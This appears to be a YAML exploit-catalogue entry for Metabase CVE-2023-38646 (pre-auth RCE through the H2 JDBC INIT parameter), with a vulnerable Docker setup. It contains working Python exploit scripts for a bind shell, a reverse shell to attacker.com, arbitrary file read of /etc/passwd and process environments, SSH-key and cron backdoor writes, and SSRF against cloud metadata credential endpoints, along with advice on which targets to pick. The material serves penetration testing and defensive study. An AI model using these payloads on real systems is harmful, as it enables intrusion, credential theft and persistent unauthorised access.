---
comment: |
  Metabase is an open-source business intelligence and analytics platform.
  CVE-2023-38646 is a pre-authentication RCE via the /api/setup/validate endpoint,
  which accepts a JDBC connection string and passes it to the H2 database driver
  without sanitization. The H2 INIT parameter allows executing arbitrary SQL,
  including CREATE ALIAS (Java method binding), to run OS commands.

  The setup-token required to access the endpoint is publicly readable at
  /api/session/properties with no authentication.

  Affects Metabase open source < 0.46.6.1 and Enterprise < 1.46.6.1.
  Listed in the CISA KEV catalog; actively exploited in the wild.
docker:
  compose: "services:\n  metabase:\n    image: metabase/metabase:v0.46.6\n    ports:\n\
    \      - \"3000:3000\"\n    environment:\n      MB_DB_TYPE: h2\n"
  note: 'Starts Metabase v0.46.6 (vulnerable to CVE-2023-38646 pre-auth RCE via H2
    JDBC).

    Access at `http://localhost:3000`. Complete the setup wizard on first visit to
    obtain

    the `setup-token` needed for the exploit (printed in startup logs and returned
    by

    `/api/session/properties`). Run `docker compose up -d && sleep 30` before browsing.

    '
functions:
  bind-shell:
  - code: |
      #!/usr/bin/env python3
      # CVE-2023-38646: bind shell via H2 Java method binding
      # Host bind.sql on attacker machine (python3 -m http.server 8888)
      # bind.sql content:
      #   CREATE ALIAS IF NOT EXISTS EXEC AS $$ String exec(String[] c)
      #   throws Exception { Runtime.getRuntime().exec(c); return null; }$$;
      #   CALL EXEC(ARRAY['/bin/sh', '-c', 'ncat -lvp 12345 -e /bin/sh &']);

      import requests

      BASE         = "http://victim.com"
      BIND_SQL_URL = "http://attacker.com:8888/bind.sql"

      token = requests.get(f"{BASE}/api/session/properties").json()["setup-token"]

      jdbc = (
          "zip:./metabase.jar!/sample-database.db"
          ";TRACE_LEVEL_SYSTEM_OUT=3"
          f";INIT=RUNSCRIPT FROM '{BIND_SQL_URL}'"
      )
      requests.post(f"{BASE}/api/setup/validate", json={
          "token": token,
          "details": {
              "is_full_sync": True, "is_on_demand": False, "name": "x",
              "engine": "h2", "details": {"db": jdbc}
          }
      })
    comment: |
      CVE-2023-38646: opens a bind shell on TCP 12345 via H2 Java method binding.
      The ncat process is detached with & so the HTTP request completes normally.
      Connect with: nc victim.com 12345
      Requires ncat on the Metabase host. The shell runs as the Metabase process user
      (commonly metabase or root in containerised deployments).
    connector: tcp-client
    contexts:
      unauthenticated:
    tty: false
    version: |
      open source < 0.46.6.1 / Enterprise < 1.46.6.1
  file-read:
  - code: |
      #!/usr/bin/env python3
      # CVE-2023-38646: read files via H2 CSVREAD in the JDBC INIT parameter
      # Host a file-read SQL script on the attacker machine:
      # read.sql content:
      #   CREATE ALIAS IF NOT EXISTS FILE_READ AS $$
      #   String fileRead(String f) throws Exception {
      #     return new java.util.Scanner(new java.io.File(f)).useDelimiter("\\A").next();
      #   }$$;
      #   CALL FILE_READ('/etc/passwd');
      #
      # python3 -m http.server 8888

      import requests

      BASE         = "http://victim.com"
      READ_SQL_URL = "http://attacker.com:8888/read.sql"

      token = requests.get(f"{BASE}/api/session/properties").json()["setup-token"]

      jdbc = (
          "zip:./metabase.jar!/sample-database.db"
          ";TRACE_LEVEL_SYSTEM_OUT=3"
          f";INIT=RUNSCRIPT FROM '{READ_SQL_URL}'"
      )
      resp = requests.post(f"{BASE}/api/setup/validate", json={
          "token": token,
          "details": {
              "is_full_sync": True,
              "is_on_demand": False,
              "name": "x",
              "engine": "h2",
              "details": {"db": jdbc}
          }
      })
      print(resp.text)
    comment: |
      CVE-2023-38646: reads arbitrary server-side files via H2's Java method binding.
      The FILE_READ alias uses java.util.Scanner to read the entire file.
      File content appears in the Metabase server logs (TRACE_LEVEL_SYSTEM_OUT=3)
      and partially in the API error response. For reliable output, write to a
      network share or send via DNS/HTTP callback from within the SQL.
      Key targets:
      - /etc/passwd, /proc/1/environ (system information, credentials in environment)
      - /opt/metabase/metabase.db.mv.db or equivalent H2 database file
      - Application config files containing API keys and database credentials
    contexts:
      unauthenticated:
    version: |
      open source < 0.46.6.1 / Enterprise < 1.46.6.1
  file-write:
  - code: |
      #!/usr/bin/env python3
      # CVE-2023-38646: write arbitrary files via H2 Java FileWriter binding
      # Host write.sql on the attacker machine (python3 -m http.server 8888)
      # write.sql content (adjust OUTPATH and CONTENT):
      #   CREATE ALIAS IF NOT EXISTS FILE_WRITE AS $$ void fw(String p, String c)
      #   throws Exception { java.io.FileWriter w=new java.io.FileWriter(p);
      #   w.write(c); w.close(); }$$;
      #   CALL FILE_WRITE('/root/.ssh/authorized_keys',
      #     'ssh-ed25519 AAAA...attacker_pubkey... attacker\n');

      import requests

      BASE          = "http://victim.com"
      WRITE_SQL_URL = "http://attacker.com:8888/write.sql"

      token = requests.get(f"{BASE}/api/session/properties").json()["setup-token"]

      jdbc = (
          "zip:./metabase.jar!/sample-database.db"
          ";TRACE_LEVEL_SYSTEM_OUT=3"
          f";INIT=RUNSCRIPT FROM '{WRITE_SQL_URL}'"
      )
      resp = requests.post(f"{BASE}/api/setup/validate", json={
          "token": token,
          "details": {
              "is_full_sync": True, "is_on_demand": False, "name": "x",
              "engine": "h2", "details": {"db": jdbc}
          }
      })
      print(resp.status_code)
    comment: "CVE-2023-38646: writes arbitrary files via H2 Java FileWriter binding\
      \ in the JDBC\nINIT parameter. The write.sql script must be hosted on a server\
      \ reachable from the\nMetabase host.\n\nUseful write targets (Metabase typically\
      \ runs as root in containers):\n- /root/.ssh/authorized_keys  (persistent SSH\
      \ access)\n- /etc/cron.d/backdoor  (cron-based persistence)\n- /proc/1/fd/<n>\
      \  (pipe injection into running processes)\n\nMetabase does not execute PHP\
      \ or JSP \u2014 use file-write for OS-level persistence\nrather than a webshell.\n"
    contexts:
      unauthenticated:
    version: |
      open source < 0.46.6.1 / Enterprise < 1.46.6.1
  rce:
  - blind: true
    code: |
      #!/usr/bin/env python3
      # Step 1: host rce.sql on the attacker machine (python3 -m http.server 8888)
      # rce.sql content:
      #   CREATE ALIAS IF NOT EXISTS EXEC AS $$ String exec(String[] c)
      #   throws Exception { Runtime.getRuntime().exec(c); return null; }$$;
      #   CALL EXEC(ARRAY['/bin/sh', '-c', 'id > /tmp/pwned']);

      import requests

      BASE = "http://victim.com"
      RCE_SQL_URL = "http://attacker.com:8888/rce.sql"

      # Retrieve the setup token (no auth required)
      token = requests.get(f"{BASE}/api/session/properties").json()["setup-token"]

      # Trigger the exploit via H2 JDBC INIT=RUNSCRIPT
      jdbc = (
          "zip:./metabase.jar!/sample-database.db"
          ";TRACE_LEVEL_SYSTEM_OUT=3"
          f";INIT=RUNSCRIPT FROM '{RCE_SQL_URL}'"
      )
      resp = requests.post(f"{BASE}/api/setup/validate", json={
          "token": token,
          "details": {
              "is_full_sync": True,
              "is_on_demand": False,
              "name": "x",
              "engine": "h2",
              "details": {"db": jdbc}
          }
      })
      print(resp.text)
    comment: "\u26A0\uFE0F CISA KEV \u2014 confirmed exploited in the wild.\nCVE-2023-38646:\
      \ the H2 INIT parameter in the JDBC URL is executed as SQL during\nconnection\
      \ setup. RUNSCRIPT FROM fetches and executes a remote SQL file, which\nuses\
      \ CREATE ALIAS to bind a Java method and execute OS commands.\n\nThe zip: URI\
      \ points to the H2 sample database bundled inside metabase.jar,\navoiding the\
      \ need to reference an external database file.\n\nrce.sql must be hosted on\
      \ a server reachable from the Metabase host. Command\noutput is not returned\
      \ in the HTTP response \u2014 write output to a file or use the\nreverse shell\
      \ entry for interactive access.\n\nRef: https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646\n"
    contexts:
      unauthenticated:
    version: |-
      open source < 0.46.6.1 / Enterprise < 1.46.6.1
  reverse-shell:
  - blind: true
    code: |
      #!/usr/bin/env python3
      # Host rev.sql on the attacker machine (python3 -m http.server 8888)
      # rev.sql content:
      #   CREATE ALIAS IF NOT EXISTS EXEC AS $$ String exec(String[] c)
      #   throws Exception { Runtime.getRuntime().exec(c); return null; }$$;
      #   CALL EXEC(ARRAY['/bin/bash', '-c',
      #     'bash -i >& /dev/tcp/attacker.com/12345 0>&1']);

      import requests

      BASE = "http://victim.com"
      REV_SQL_URL = "http://attacker.com:8888/rev.sql"

      token = requests.get(f"{BASE}/api/session/properties").json()["setup-token"]

      jdbc = (
          "zip:./metabase.jar!/sample-database.db"
          ";TRACE_LEVEL_SYSTEM_OUT=3"
          f";INIT=RUNSCRIPT FROM '{REV_SQL_URL}'"
      )
      requests.post(f"{BASE}/api/setup/validate", json={
          "token": token,
          "details": {
              "is_full_sync": True,
              "is_on_demand": False,
              "name": "x",
              "engine": "h2",
              "details": {"db": jdbc}
          }
      })
    comment: |
      CVE-2023-38646: spawns a reverse bash shell via H2 JDBC Java method injection.
      The shell runs as the Metabase process user (commonly metabase or root in containers).
      The SQL file must be reachable from the Metabase host over HTTP.
    contexts:
      unauthenticated:
    listener: tcp-server
    tty: false
    version: |-
      open source < 0.46.6.1 / Enterprise < 1.46.6.1
  ssrf:
  - code: "# CVE-2023-38646: SSRF via H2 JDBC INIT with RUNSCRIPT FROM attacker URL\n\
      # The INIT parameter fetches the SQL file from a URL \u2014 the request originates\n\
      # from the Metabase server, probing any URL reachable from it.\nimport requests\n\
      \nBASE = \"http://victim.com\"\n\ntoken = requests.get(f\"{BASE}/api/session/properties\"\
      ).json()[\"setup-token\"]\n\n# Use an internal URL as the RUNSCRIPT target \u2014\
      \ the Metabase server fetches it:\njdbc = (\n    \"zip:./metabase.jar!/sample-database.db\"\
      \n    \";TRACE_LEVEL_SYSTEM_OUT=3\"\n    \";INIT=RUNSCRIPT FROM 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'\"\
      \n)\nresp = requests.post(f\"{BASE}/api/setup/validate\", json={\n    \"token\"\
      : token,\n    \"details\": {\n        \"is_full_sync\": True, \"is_on_demand\"\
      : False, \"name\": \"x\",\n        \"engine\": \"h2\", \"details\": {\"db\"\
      : jdbc}\n    }\n})\n# The server-side HTTP error (non-SQL response from the\
      \ metadata endpoint)\n# appears in the response or logs, confirming the outbound\
      \ request was made.\nprint(resp.text)\n"
    comment: "CVE-2023-38646: the H2 JDBC INIT=RUNSCRIPT FROM parameter fetches a\
      \ SQL file from\na URL server-side. Supplying an internal URL causes the Metabase\
      \ server to make an\noutbound HTTP GET to the target, probing internal services\
      \ or cloud metadata endpoints.\nThe HTTP response is parsed as SQL \u2014 any\
      \ non-SQL response produces an error that\nmay partially reflect the response\
      \ body, making this a semi-blind SSRF.\nFor more reliable extraction, host an\
      \ attacker HTTP server and observe incoming requests.\nCloud metadata endpoints:\n\
      - AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\
      - GCP:        http://metadata.google.internal/computeMetadata/v1/\n- Azure:\
      \      http://169.254.169.254/metadata/instance?api-version=2021-02-01\n"
    contexts:
      unauthenticated:
    version: |
      open source < 0.46.6.1 / Enterprise < 1.46.6.1
